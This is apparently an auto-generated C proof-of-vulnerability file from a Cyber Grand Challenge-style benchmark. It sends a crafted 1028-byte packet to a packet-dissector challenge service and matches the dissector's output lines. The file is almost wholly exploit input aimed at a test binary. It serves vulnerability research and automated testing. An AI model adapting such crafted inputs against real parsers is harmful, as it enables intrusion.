#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xd2\x5e\xb6\xf9"
         "\x95\xe7\x33\x47\x52\x65\x47\xca\xd6\x00\x00\x00\xf2\x55\x0f\xa2"
         "\x65\x42\xe8\x3d\x80\x30\xa8\xe2\x6f\xc4\x48\xd9\x6e\x78\xef\x8a"
         "\x0b\xf5\xc8\x05\x5b\x54\xe2\xbf\x31\x8a\x66\xbf\x68\x76\xe4\x32"
         "\x45\x49\x15\x71\x87\xb1\x8a\x59\x29\x6c\xdb\x87\xc8\xf1\x17\x31"
         "\xfe\xef\xe4\x01\x97\xee\xae\xeb\x7d\xe8\x38\xe0\xb9\x99\x9e\x4e"
         "\x48\x01\xf3\x35\xaa\x1c\xf0\xde\x43\x33\x8f\xef\x52\x3d\xf7\xe5"
         "\xda\xaf\x3a\xc3\xb3\xab\xc5\xfe\xc3\x8a\xd6\x8f\xfc\x55\xe9\x0e"
         "\x62\x82\xa0\xde\xda\x18\x75\x14\x57\x57\x5f\xe6\xd0\x5a\x0c\x00"
         "\x00\x1e\x47\xf7\xe2\x81\xa2\x16\xef\x82\x89\xab\x9a\xd5\x73\x70"
         "\x8c\x42\x5d\x3f\xe0\x45\xf4\xd6\x78\x1b\x78\x99\x60\xb1\xeb\xc5"
         "\x7e\x24\xba\x5e\xb2\x2a\x45\xcd\xb5\xe8\xca\xa1\xa4\x3c\x8b\x05"
         "\x99\x99\xef\x06\xc3\x31\x84\x2d\x4c\xc5\xf2\xe4\x1e\x26\x2d\x52"
         "\x7b\x8e\x85\x16\xf4\x48\x2c\x94\x8e\xb9\x3d\x37\xc7\xf3\x80\x3b"
         "\x15\x57\xa2\xba\x1a\xc8\x93\x85\x87\x31\x37\xb9\x5e\xa7\x60\xe0"
         "\x8a\xc0\x0c\xb8\xa9\x4e\x52\x12\xca\x3d\x32\x6d\x14\x7d\xeb\xd8"
         "\xe4\xab\xc7\xe5\x75\x37\xe7\xdd\x53\x8d\x8a\x53\x53\x43\xbb\x7c"
         "\xa5\x54\x50\xed\x99\xb7\x17\x74\x72\x08\x01\x69\x31\x10\x87\x7e"
         "\xe1\x4b\xc8\xaa\x99\xb7\xba\x8d\xde\x60\x5e\x26\x5c\x81\xa5\x7b"
         "\x91\x17\x7b\x46\x05\x0a\x05\x15\xcf\xfc\x02\xfd\xe8\xc6\x8f\x1a"
         "\x47\x10\xa9\xd0\x10\xdd\x7e\x7e\xd6\xce\xe2\xfd\x2a\xf0\x74\x22"
         "\x1d\x9d\xb4\x5b\xb1\x41\xce\xd9\x03\x14\x8e\x93\x1c\xaf\x35\x64"
         "\x48\x70\x07\x6e\xdc\xe6\x6f\xfd\xd5\xf7\x31\x5c\xfe\xf7\x03\xce"
         "\xf4\x7e\x16\x85\x50\x3e\x9a\xd8\xc5\xab\xc8\x64\x37\x15\xef\x24"
         "\xbe\x50\x0b\xa3\x8e\x32\xee\x3e\x22\x1e\x30\x0b\x89\x46\x5a\x54"
         "\xd9\x21\xf5\xdb\x38\x59\xdb\x59\xd1\x01\xeb\x40\x22\x77\x86\x1f"
         "\xbb\x26\xd3\x5e\x2f\x0b\x0f\xae\x10\x0f\xd7\x5c\x33\xb1\xfd\xf4"
         "\x2c\x10\x33\xb4\xdb\x63\x91\xa0\x49\x07\xbb\x4c\x57\x78\xbc\x3d"
         "\xed\xb6\x71\xde\x65\xdb\x63\xc0\xe6\x8b\x20\x1b\xe8\x51\xe0\x27"
         "\xaf\x01\x8a\x29\xad\x3d\x06\x35\x79\x5a\xfc\x59\x94\xbf\xc8\x96"
         "\xd6\x5e\xb2\x0c\x28\xf1\x38\xa7\xeb\xfc\x81\xa3\x28\x41\x18\xee"
         "\xc4\x23\xea\xa3\x82\x20\x7d\x56\x24\x0c\x16\x40\x01\xa3\xd5\x44"
         "\xe5\x30\x08\xd9\x17\xcf\x86\x4d\x4d\xfc\xe6\xd7\xe5\xa5\x29\xb8"
         "\x66\x76\x46\xab\x64\x9a\x52\xca\x61\x7c\xba\x06\x0e\xa8\x33\x57"
         "\x04\x00\x3d\xf2\x8e\xfb\xaf\x8c\x32\xb3\xb8\x22\x38\x94\x0a\x6b"
         "\xe5\xe5\xe7\x9e\x69\xa9\xc9\xe5\xf9\x8c\x08\xc5\x90\x56\x88\xa3"
         "\xd6\xab\x46\x85\x25\x56\x60\xb5\x20\x73\x57\xa6\xfa\x25\xc6\xa4"
         "\xa0\x9e\xfc\xb7\x3a\x11\xfb\xb6\xe5\x1c\x9d\xa4\xa7\x41\x80\x24"
         "\x1e\x7a\xbb\x71\x97\x92\x6c\xfb\x2e\x92\x1d\x90\x0a\x4e\x38\x6f"
         "\xbe\xa8\x97\x8c\xa7\xd9\x6d\xf7\xa3\x0f\x13\xf2\x33\x7e\xf8\x18"
         "\xdd\xc2\x11\x81\x22\x83\xb9\xef\x8d\x26\x39\x59\x47\x1c\x9e\xca"
         "\x64\xc6\xb1\x76\xcc\x76\x6c\xb0\xcc\x0d\x8d\xc8\xf0\x52\x0c\x00"
         "\x4d\xd5\xac\xbd\xf5\x29\xdb\xf9\xa2\xd5\x5b\x12\x22\x83\x81\x35"
         "\x7e\x53\x8a\x08\x97\x71\x0a\x4f\x36\x1c\xae\x24\x82\x48\x55\x9f"
         "\xf1\x5e\x46\x29\x34\x13\x40\x4a\x3e\x10\x67\xab\xda\x94\xdb\xb8"
         "\xd4\x92\xc0\x19\x1b\xce\x56\x23\x26\x0a\xc0\x63\xc5\xdc\x24\x82"
         "\xc8\xc1\x6e\x13\x7e\x10\xf9\x1f\xb2\x93\x16\x33\x65\x15\xf8\x74"
         "\x22\x82\x14\x0b\x60\x04\xc1\x32\xf3\x69\x28\x9a\x19\x59\x26\xca"
         "\x9d\x7e\xf0\x9e\x07\x23\x48\x9f\x9a\x30\x57\xef\xb4\xa6\x79\x9f"
         "\x10\xe8\x58\x4e\x9f\x2b\x65\x81\x41\x83\x33\xb6\x12\xc2\x80\x2a"
         "\x65\x28\x3c\x76\xb7\x85\x57\x21\xf4\x59\x29\x9b\xcf\xea\x05\xde"
         "\x2e\x02\xcb\x3d\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===catastateateliosis
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x63\x61\x74\x61\x73\x74\x61\x74\x65\x61\x74"
         "\x65\x6c\x69\x6f\x73\x69\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
